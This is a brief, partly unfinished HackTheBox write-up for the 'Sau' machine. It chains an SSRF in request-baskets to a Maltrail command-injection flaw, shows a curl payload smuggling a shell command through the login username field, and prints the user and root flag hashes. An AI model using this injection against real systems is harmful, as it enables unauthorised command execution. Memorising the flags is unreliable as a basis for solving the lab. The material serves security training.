---
title: "Sau"
date: 2023-12-25
tags:
  - HackTheBox
  - Writeup
  - Linux
  - Web
  - Maltrail
  - RCE
sidebar:
  hide: true
---

[← Back to HackTheBox Writeups](/writeups/redteam/htb/)

# **Sau**

![Sau](https://live.staticflickr.com/65535/53504554778_37dfd44416_c.jpg)

<details>
<summary>ℹ️ Machine Information</summary>

**Machine**: [Sau](https://app.hackthebox.com/machines/551)  
**Level**: `Easy`  
**Tags**: `Linux`, `Web`, `Maltrail`, `RCE`  
**Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/551)

</details>

---

> **Note**: Full writeup content should be copied from `docs/pages/writeups/htb/sau.md`.
> Convert `??? info "Info"` to `<details><summary>Info</summary>...</details>` and `{.maxH300 loading=lazy}` to `style="max-height:300px;" loading="lazy"`.

---

## 🚀 **Starting**

```bash
echo 10.10.11.224 | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.224
```

Key findings: Port 22 (SSH), Port 80 (filtered), Port 55555 (HTTP - request-baskets).

---

## 🪲 **Vulnerability Scan**

Port 80 is filtered. Port 55555 runs **request-baskets v1.2.1** — vulnerable to SSRF (CVE-2023-27163).
Using SSRF to reach the internal port 80 running **Maltrail v0.53** — vulnerable to OS command injection (RCE).

---

## 🎯 **Exploit**

1. Create a basket that forwards to `http://127.0.0.1:80`
2. Access the Maltrail login page through the basket
3. Exploit Maltrail's unauthenticated RCE via the `username` parameter

```bash
curl 'http://sau.htb:55555/<basket>/login' \
  --data 'username=;`id > /tmp/pwned`'
```

---

## 🏁 **Flag Exfiltration**

<details>
<summary>🏁 Reveal Flags</summary>

#### **User Flag**
```
a1ee88f0fd2d5ca26e0beba49f4f0e01
```
#### **Root Flag**
```
bc2b8c74c48d07c7faf5c1e1f40d8b55
```

</details>

---

_See you in the next writeup!_
